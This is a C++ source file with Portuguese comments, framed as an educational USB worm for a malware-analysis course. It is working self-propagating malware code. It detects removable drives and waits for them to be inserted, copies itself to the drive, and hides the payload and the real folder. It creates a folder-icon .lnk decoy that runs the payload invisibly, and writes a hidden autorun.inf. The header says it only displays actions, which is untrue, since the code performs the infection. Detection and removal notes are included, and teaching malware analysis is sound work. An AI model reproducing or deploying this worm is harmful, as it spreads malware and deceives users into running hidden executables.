/*
 * ============================================================
 *  USB_WORM.CPP  —  Simulador Educacional de USB Worm
 * ============================================================
 *
 *  CONTEXTO HISTÓRICO:
 *  - Stuxnet (2010): usou LNK exploit + autorun para atacar
 *    PLCs industriais iranianos via pendrive em rede air-gapped
 *  - Conficker (2008): se espalhava via autorun.inf em pendrives
 *  - Agent.BTZ (2008): infectou redes militares dos EUA via USB
 *
 *  TÉCNICAS DEMONSTRADAS:
 *    1. Detecção de drive removível (GetDriveTypeA)
 *    2. Cópia do payload para o pendrive
 *    3. Criação de autorun.inf (técnica clássica)
 *    4. Criação de atalho .lnk malicioso (técnica moderna)
 *    5. Ocultação de arquivos originais (SetFileAttributesA)
 *    6. Pasta falsa com ícone enganoso (engenharia social)
 *    7. Monitoramento de inserção via WM_DEVICECHANGE
 *
 *  COMO ANALISTAS DETECTAM:
 *    - Autoruns (Sysinternals): lista tudo que executa no boot/USB
 *    - Process Monitor: filtro "Path contains autorun.inf"
 *    - USB Write Blocker: bloqueia escrita em hardware
 *    - EDR: alerta em cópia de .exe para drive removível
 *
 *  SAÍDA DO LAB:
 *    O programa exibe o que faria — confirme antes de executar
 *    em um pendrive real.
 *
 *  COMPILE:
 *    g++ usb_worm.cpp -o usb_worm.exe -static -static-libgcc
 *        -static-libstdc++ -lole32 -lshell32 -luuid -mwindows
 * ============================================================
 */

#include <windows.h>
#include <dbt.h>          // WM_DEVICECHANGE, DEV_BROADCAST_*
#include <shlobj.h>       // IShellLink — para criar atalhos .lnk
#include <objbase.h>      // COM interface
#include <iostream>
#include <fstream>
#include <string>
#include <vector>

// ═══════════════════════════════════════════════════════════
//  CONFIGURAÇÃO DO LAB
// ═══════════════════════════════════════════════════════════

// Nome do payload que será copiado para o pendrive
// Em um worm real: nome idêntico ao executável atual (GetModuleFileName)
const std::string NOME_PAYLOAD    = "documento_importante.exe";

// Nome da pasta falsa criada no pendrive (engenharia social)
const std::string NOME_PASTA_FAKE = "Fotos Viagem 2025";

// Nome do atalho .lnk visível ao usuário
const std::string NOME_ATALHO     = "Fotos Viagem 2025.lnk";

// Mensagem que aparece ao "infectar" (simulação)
const std::string MENSAGEM_LAB    = "[LAB] Worm se propagaria aqui";


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 1 — DETECÇÃO DE DRIVES REMOVÍVEIS
//
//  TÉCNICA: Itera todas as letras de drive (A: a Z:)
//  e verifica se é do tipo DRIVE_REMOVABLE.
//
//  WORMS REAIS também verificam:
//    DRIVE_REMOTE  → compartilhamentos de rede (propagação lateral)
//    DRIVE_FIXED   → HD local (infecção do host)
//
//  DETECÇÃO:
//    Process Monitor → filtro: Operation=QueryDeviceInformation
//    EDR → alerta em GetDriveTypeA chamado em loop rápido
// ═══════════════════════════════════════════════════════════
std::vector<std::string> detectarPendrives() {
    std::vector<std::string> drives;

    for (char letra = 'A'; letra <= 'Z'; letra++) {
        std::string drive = std::string(1, letra) + ":\\";

        UINT tipo = GetDriveTypeA(drive.c_str());

        if (tipo == DRIVE_REMOVABLE) {
            // Verifica se o drive está acessível (pendrive inserido)
            DWORD serial, maxComp, flags;
            if (GetVolumeInformationA(drive.c_str(), NULL, 0,
                &serial, &maxComp, &flags, NULL, 0)) {
                drives.push_back(drive);
            }
        }
    }
    return drives;
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 2 — AUTORUN.INF (TÉCNICA CLÁSSICA)
//
//  HISTÓRIA:
//  O autorun.inf era executado AUTOMATICAMENTE pelo Windows
//  ao inserir qualquer mídia removível até o Windows Vista.
//  A Microsoft desabilitou o autorun para drives USB no
//  Windows 7 (KB971029) após o Conficker devastar redes.
//
//  ESTRUTURA DO ARQUIVO:
//    [autorun]
//    open=payload.exe        ← executa automaticamente
//    icon=payload.exe,0      ← ícone do drive no Explorer
//    label=USB Kingston      ← nome exibido no Explorer
//    action=Abrir pasta...   ← texto do prompt de autorun
//    shell\open=Abrir
//    shell\open\command=payload.exe
//
//  AINDA ÚTIL EM 2025?
//    - Windows 7+ bloqueou autorun automático
//    - Mas o arquivo ainda influencia ícone e label do drive
//    - Alguns sistemas embarcados e Windows legado ainda executam
//    - É um IOC forte: Autoruns.exe o lista como entry suspeita
//
//  DETECÇÃO:
//    $ strings pendrive:\autorun.inf  → revela o payload
//    Autoruns.exe → aba "Removable Media" lista autorun.inf
// ═══════════════════════════════════════════════════════════
void criarAutorunInf(const std::string& drive) {
    std::string caminho = drive + "autorun.inf";
    std::ofstream f(caminho);

    f << "; Arquivo criado por USB Worm Educacional\n";
    f << "; Em ataque real nao teria este comentario\n\n";
    f << "[autorun]\n";
    f << "open=" << NOME_PAYLOAD << "\n";
    f << "icon=" << NOME_PAYLOAD << ",0\n";
    f << "label=USB Kingston 32GB\n";
    f << "action=Abrir para ver arquivos\n\n";
    f << "[Content]\n";
    f << "MusicFiles=0\n";
    f << "PictureFiles=1\n";
    f << "VideoFiles=0\n";

    // Oculta o arquivo do Explorer (atributo Hidden + System)
    // ANÁLISE: attrib +h +s autorun.inf — comando que worms usam
    SetFileAttributesA(caminho.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    std::cout << "  [+] autorun.inf criado: " << caminho << std::endl;
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 3 — ATALHO .LNK MALICIOSO (TÉCNICA MODERNA)
//
//  TÉCNICA USADA PELO STUXNET:
//  Stuxnet criou atalhos .lnk que pareciam pastas normais.
//  Ao renderizar o ícone, o Windows executava o exploit
//  (CVE-2010-2568) sem o usuário clicar — só de abrir a pasta!
//
//  VERSÃO EDUCACIONAL (sem exploit):
//  O atalho aponta para o payload mas tem:
//    - Ícone de pasta do sistema (parece uma pasta normal)
//    - Nome igual a uma pasta existente
//    - A pasta real está oculta
//  → Usuário vê "Fotos Viagem 2025" e clica achando ser pasta
//  → Na verdade executa o payload
//
//  ESTRUTURA DO ATALHO:
//    Target:    C:\pendrive\documento_importante.exe  (oculto)
//    Icon:      %SystemRoot%\System32\shell32.dll,3   (ícone pasta)
//    Arguments: (vazio ou argumentos extras)
//    Window:    SW_HIDE (executa invisível)
//
//  DETECÇÃO:
//    - Clique direito → Propriedades: Target aponta para .exe
//    - Process Monitor: CreateProcess após abrir .lnk
//    - strings: extrai o path do target do binário .lnk
// ═══════════════════════════════════════════════════════════
bool criarAtalhoMalicioso(const std::string& drive) {
    // Inicializa COM (necessário para IShellLink)
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return false;

    IShellLinkA* pLink = NULL;
    IPersistFile* pFile = NULL;
    bool sucesso = false;

    // Cria interface IShellLink
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                          IID_IShellLinkA, (void**)&pLink);
    if (FAILED(hr)) { CoUninitialize(); return false; }

    // Define o TARGET do atalho (o payload)
    std::string targetPath = drive + NOME_PAYLOAD;
    pLink->SetPath(targetPath.c_str());

    // Define o diretório de trabalho
    pLink->SetWorkingDirectory(drive.c_str());

    // ÍCONE DE PASTA — engana o usuário visualmente
    // shell32.dll índice 3 = ícone de pasta amarela padrão
    // ANÁLISE: ícone incomum para um .lnk é sinal de alerta
    pLink->SetIconLocation("%SystemRoot%\\System32\\shell32.dll", 3);

    // Janela oculta — executa sem mostrar nada
    // ANÁLISE: SW_HIDE em atalhos é fortemente suspeito
    pLink->SetShowCmd(SW_HIDE);

    // Descrição (aparece no tooltip ao passar o mouse)
    pLink->SetDescription("Fotos da viagem de ferias");

    // Salva o .lnk no pendrive
    hr = pLink->QueryInterface(IID_IPersistFile, (void**)&pFile);
    if (SUCCEEDED(hr)) {
        // IPersistFile::Save requer wstring
        std::string caminhoLnk = drive + NOME_ATALHO;
        std::wstring wCaminho(caminhoLnk.begin(), caminhoLnk.end());
        hr = pFile->Save(wCaminho.c_str(), TRUE);
        if (SUCCEEDED(hr)) {
            sucesso = true;
            std::cout << "  [+] Atalho .lnk criado: " << caminhoLnk << std::endl;
        }
        pFile->Release();
    }

    pLink->Release();
    CoUninitialize();
    return sucesso;
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 4 — CÓPIA DO PAYLOAD + OCULTAÇÃO
//
//  FLUXO COMPLETO DE INFECÇÃO DO USB:
//
//  1. Copia o executável do worm para o pendrive
//     (nome inócuo: "documento_importante.exe")
//
//  2. Cria pasta com nome atraente ("Fotos Viagem 2025")
//     e a OCULTA (atributo Hidden)
//
//  3. Cria atalho .lnk com mesmo nome da pasta
//     e ícone de pasta → usuário vê "pasta", clica = executa
//
//  4. Cria autorun.inf (para sistemas legados)
//
//  RESULTADO VISUAL NO EXPLORER:
//    [ícone pasta] Fotos Viagem 2025        ← .lnk (MALICIOSO)
//    [arquivo oculto] documento_importante.exe  ← payload
//    [arquivo oculto] autorun.inf               ← autorun
//    [pasta oculta]  Fotos Viagem 2025/    ← pasta real oculta
//
//  WORMS AVANÇADOS também:
//    - Copiam para %TEMP% e criam Registry Run key
//    - Usam nomes de processo legítimos (svchost.exe, explorer.exe)
//    - Assinam digitalmente o payload (certificado roubado)
// ═══════════════════════════════════════════════════════════
void copiarPayload(const std::string& drive) {
    // Caminho do executável atual (o próprio worm se copiando)
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    std::string destino = drive + NOME_PAYLOAD;

    // CopyFileA: copia o executável para o pendrive
    if (CopyFileA(selfPath, destino.c_str(), FALSE)) {
        std::cout << "  [+] Payload copiado: " << destino << std::endl;

        // Oculta o payload
        SetFileAttributesA(destino.c_str(),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    } else {
        std::cout << "  [-] Falha ao copiar payload (sem permissao?)" << std::endl;
    }
}

void criarPastaFake(const std::string& drive) {
    std::string caminhoPasta = drive + NOME_PASTA_FAKE;

    // Cria a pasta real com arquivos inócuos (isca)
    CreateDirectoryA(caminhoPasta.c_str(), NULL);

    // Cria arquivo isca dentro da pasta (conteúdo irrelevante)
    std::ofstream isca(caminhoPasta + "\\IMG_001.txt");
    isca << "[simulacao de foto JPEG]";
    isca.close();

    // OCULTA a pasta real — usuário não a vê no Explorer
    // Só vê o atalho .lnk com ícone de pasta
    SetFileAttributesA(caminhoPasta.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    std::cout << "  [+] Pasta fake criada e ocultada: " << caminhoPasta << std::endl;
}


// ═══════════════════════════════════════════════════════════
//  SEÇÃO 5 — MONITORAMENTO DE INSERÇÃO VIA WM_DEVICECHANGE
//
//  TÉCNICA AVANÇADA:
//  Em vez de polling (verificar drives a cada X segundos),
//  worms avançados registram uma janela oculta e escutam
//  WM_DEVICECHANGE — notificação do Windows quando um
//  dispositivo USB é inserido ou removido.
//
//  VANTAGEM:
//    - Resposta instantânea (< 1 segundo após inserção)
//    - Zero CPU em espera (event-driven, não polling)
//    - Janela oculta = processo invisível ao usuário
//
//  ANÁLISE:
//    - Process Hacker: processo sem janela visível mas com
//      uma janela hidden registrada = suspeito
//    - Wireshark: após inserção → tráfego de rede = exfiltração
// ═══════════════════════════════════════════════════════════

// Variável global para sinalizar que um USB foi detectado
bool g_usbDetectado = false;
std::string g_driveDetectado;

LRESULT CALLBACK WndProcMonitor(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_DEVICECHANGE) {
        // DBT_DEVICEARRIVAL = dispositivo recém inserido
        if (wParam == DBT_DEVICEARRIVAL) {
            DEV_BROADCAST_HDR* hdr = (DEV_BROADCAST_HDR*)lParam;
            if (hdr && hdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                DEV_BROADCAST_VOLUME* vol = (DEV_BROADCAST_VOLUME*)hdr;

                // Converte bitmask da unidade para letra de drive
                // Ex: bitmask 0x04 = bit 2 = drive C: (A=0, B=1, C=2...)
                for (int i = 0; i < 26; i++) {
                    if (vol->dbcv_unitmask & (1 << i)) {
                        g_driveDetectado = std::string(1, 'A' + i) + ":\\";
                        g_usbDetectado = true;
                        PostQuitMessage(0); // Sai do loop para processar
                        break;
                    }
                }
            }
        }
    }
    return DefWindowProcA(hWnd, msg, wParam, lParam);
}

// Cria janela oculta e aguarda inserção de USB
std::string aguardarInsercaoUSB() {
    HINSTANCE hInst = GetModuleHandleA(NULL);

    WNDCLASSA wc = {};
    wc.lpfnWndProc   = WndProcMonitor;
    wc.hInstance     = hInst;
    wc.lpszClassName = "USBMonitor";
    RegisterClassA(&wc);

    // Janela invisível — apenas para receber mensagens do sistema
    HWND hWnd = CreateWindowA("USBMonitor", "", 0,
        0, 0, 0, 0, HWND_MESSAGE, NULL, hInst, NULL);

    std::cout << "[*] Aguardando insercao de pendrive..." << std::endl;
    std::cout << "    (Insira um pendrive ou pressione Ctrl+C para cancelar)" << std::endl;

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    DestroyWindow(hWnd);
    return g_driveDetectado;
}


// ═══════════════════════════════════════════════════════════
//  MAIN — Orquestra o worm
// ═══════════════════════════════════════════════════════════
int main() {
    // Força console para modo de saída correto no Windows
    SetConsoleOutputCP(CP_UTF8);

    std::cout << "============================================" << std::endl;
    std::cout << " USB WORM EDUCACIONAL" << std::endl;
    std::cout << " Curso: Defesa Cibernetica - Malware Analysis" << std::endl;
    std::cout << "============================================" << std::endl << std::endl;

    std::cout << "TECNICAS DEMONSTRADAS:" << std::endl;
    std::cout << "  1. autorun.inf (Windows XP/Vista legado)" << std::endl;
    std::cout << "  2. Atalho .lnk com icone de pasta (moderno)" << std::endl;
    std::cout << "  3. Ocultacao de arquivos (Hidden + System)" << std::endl;
    std::cout << "  4. Auto-copia via GetModuleFileName + CopyFile" << std::endl;
    std::cout << "  5. Monitoramento via WM_DEVICECHANGE" << std::endl;
    std::cout << std::endl;

    // FASE 1: Verifica se já há pendrive inserido
    std::vector<std::string> drivesAtuais = detectarPendrives();

    std::string driveAlvo;

    if (!drivesAtuais.empty()) {
        std::cout << "[*] Pendrive(s) detectado(s):" << std::endl;
        for (size_t i = 0; i < drivesAtuais.size(); i++) {
            std::cout << "    [" << i << "] " << drivesAtuais[i] << std::endl;
        }
        std::cout << std::endl;
        std::cout << "Deseja infectar o pendrive " << drivesAtuais[0] << "? (s/n): ";
        char resp;
        std::cin >> resp;
        if (resp == 's' || resp == 'S') {
            driveAlvo = drivesAtuais[0];
        } else {
            std::cout << "[*] Operacao cancelada pelo usuario." << std::endl;
            system("pause");
            return 0;
        }
    } else {
        // FASE 2: Nenhum pendrive inserido — aguarda via WM_DEVICECHANGE
        std::cout << "[*] Nenhum pendrive detectado ainda." << std::endl;
        driveAlvo = aguardarInsercaoUSB();

        if (driveAlvo.empty()) {
            std::cout << "[-] Nenhum drive detectado." << std::endl;
            system("pause");
            return 1;
        }

        std::cout << "[+] Pendrive detectado: " << driveAlvo << std::endl;
        std::cout << "Deseja infectar " << driveAlvo << "? (s/n): ";
        char resp;
        std::cin >> resp;
        if (resp != 's' && resp != 'S') {
            std::cout << "[*] Operacao cancelada." << std::endl;
            system("pause");
            return 0;
        }
    }

    // FASE 3: Executa a infecção do pendrive
    std::cout << std::endl;
    std::cout << "[*] Iniciando propagacao para: " << driveAlvo << std::endl;
    std::cout << "-------------------------------------------" << std::endl;

    copiarPayload(driveAlvo);
    criarPastaFake(driveAlvo);
    criarAtalhoMalicioso(driveAlvo);
    criarAutorunInf(driveAlvo);

    // FASE 4: Resumo forense
    std::cout << "-------------------------------------------" << std::endl;
    std::cout << std::endl;
    std::cout << "RESUMO — O que foi criado no pendrive:" << std::endl;
    std::cout << "  " << driveAlvo << NOME_PAYLOAD
              << "  [OCULTO - payload]" << std::endl;
    std::cout << "  " << driveAlvo << NOME_ATALHO
              << "  [VISIVEL - armadilha]" << std::endl;
    std::cout << "  " << driveAlvo << NOME_PASTA_FAKE
              << "\\  [OCULTO - pasta isca]" << std::endl;
    std::cout << "  " << driveAlvo << "autorun.inf"
              << "         [OCULTO - legado]" << std::endl;
    std::cout << std::endl;
    std::cout << "COMO DETECTAR (ferramentas):" << std::endl;
    std::cout << "  Autoruns.exe  -> aba Removable Media" << std::endl;
    std::cout << "  Process Mon.  -> filtro Path contains autorun.inf" << std::endl;
    std::cout << "  attrib " << driveAlvo << "*.*  -> lista arquivos ocultos" << std::endl;
    std::cout << "  dir /a:hs " << driveAlvo << "  -> mostra Hidden+System" << std::endl;
    std::cout << std::endl;
    std::cout << "COMO REMOVER:" << std::endl;
    std::cout << "  attrib -h -s " << driveAlvo << "*.* /s /d" << std::endl;
    std::cout << "  del " << driveAlvo << "autorun.inf" << std::endl;
    std::cout << "  del " << driveAlvo << NOME_ATALHO << std::endl;
    std::cout << "  del " << driveAlvo << NOME_PAYLOAD << std::endl;
    std::cout << "============================================" << std::endl;

    system("pause");
    return 0;
}
